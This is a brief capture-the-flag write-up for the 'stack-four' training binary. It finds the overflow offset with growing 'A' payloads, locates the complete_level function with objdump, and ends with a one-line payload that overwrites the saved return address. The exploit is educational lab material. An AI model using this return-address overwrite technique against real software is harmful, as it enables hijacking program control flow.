#Working on the problem
This challenge revolves around overwriting the saved intstruction pointer. 
To do this enough data has to be sent in to override the return pointer on the stack.
With this in mind I just started sending in larger and larger amounts of data to try override the stack pointer.
After a while this one liner generated the segfault that the challenge requires.
```
python3 -c 'print("A"*89)' | ./stack-four
```
This generated the specific output.
```

and will be returning to 0x41
Segmentation fault
```
Now you need to find the address of the "complete_level" function.
To do this use objdump.
```
objdump -M intel -d stack-four | grep "complete_level"
```
This generated the output.
```
000000000040061d <complete_level>:
```
#Final Answer
```
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*88 + b"\x1d\x06\x40")' | ./stack-four
```
